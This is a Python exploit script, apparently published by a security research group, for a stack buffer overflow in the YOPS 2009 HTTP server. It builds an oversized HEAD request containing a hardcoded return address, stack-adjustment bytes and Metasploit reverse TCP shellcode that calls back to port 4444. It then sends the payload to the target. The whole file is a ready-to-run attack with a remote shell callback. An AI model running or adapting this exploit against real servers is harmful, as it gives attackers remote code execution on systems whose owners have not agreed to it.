#!/usr/bin/python
# Software:
# YOPS (Your Own Personal [WEB] Server) is a small SEDA-like HTTP
server for Linux OS written in C.
# URL: http://sourceforge.net/projects/yops2009/
#
# Vulnerability: Rodrigo Escobar aka ipax @ DcLabs
# Exploit: Flavio do Carmo Junior aka waKKu @ DcLabs
# Contact: waKKu <AT> dclabs <DOT> com <DOT> br

HOST = "localhost"
PORT = 8888

import socket
import sys
import time

try:
	BUFF_LEN = int(sys.argv[1])
except:
	BUFF_LEN = 802
FIXUP_ADDR = "\x47\xce\x04\x08"

shellcode = (
# MetaSploit Reverse TCP Shell. Host: 127.0.0.1 - Port: 4444
"\x33\xc9\xb1\x13\xbe\xae\x88\x55\xcb\xda\xcd\xd9\x74\x24\xf4"
"\x5f\x31\x77\x0e\x03\x77\x0e\x83\x69\x8c\xb7\x3e\x44\x56\xc0"
"\x22\xf5\x2b\x7c\xcf\xfb\x22\x63\xbf\x9d\xf9\xe4\x9b\x3f\x6a"
"\x9a\x1b\xbf\x6b\x02\x74\xae\x37\xac\xd7\xba\xd7\x61\x88\xb3"
"\x39\xc2\x42\xa5\xe1\x08\x12\x70\x95\x4a\xa3\xbd\x54\xec\x8d"
"\xb8\x9f\xbd\x65\x15\x4f\x4d\x1e\x01\xa0\xd3\xb7\xbf\x37\xf0"
"\x18\x6c\xc1\x16\x28\x99\x1c\x58\x43"
)


buffer = "HEAD "
buffer += "A"*BUFF_LEN
buffer += FIXUP_ADDR*4
buffer += " HTTP/1.1"

stackadjust = (
		"\xcb" # instruction alignment
		"\xbc\x69\x69\x96\xb0" # Stack Adjustment
)

payload = buffer + stackadjust + shellcode + "\r\n\r\n"

print """
######################################
### DcLabs Security Research Group ###
###            +Exploit+           ###
######################################
Software: YOPS 2009 - Web Server
---
Vulnerability by: ipax
Exploit by: waKKu
Greetings to: All DcLabs members
"""

print " [+] Using BUFF_LEN -> ", str(BUFF_LEN)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print " [+] Trying to establish connection..."
s.connect((HOST, PORT))
print " [+] Sending a dummy request to initialize data..."
s.send("HEAD DcLabs HTTP/1.1\r\n\r\n")
try:
	s.recv(1024)
except:
	pass
s.close()

time.sleep(3)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
print " [+] Sending our malicious payload..."
s.send(payload)
print " [+] Payload sent, good luck!"
s.close()
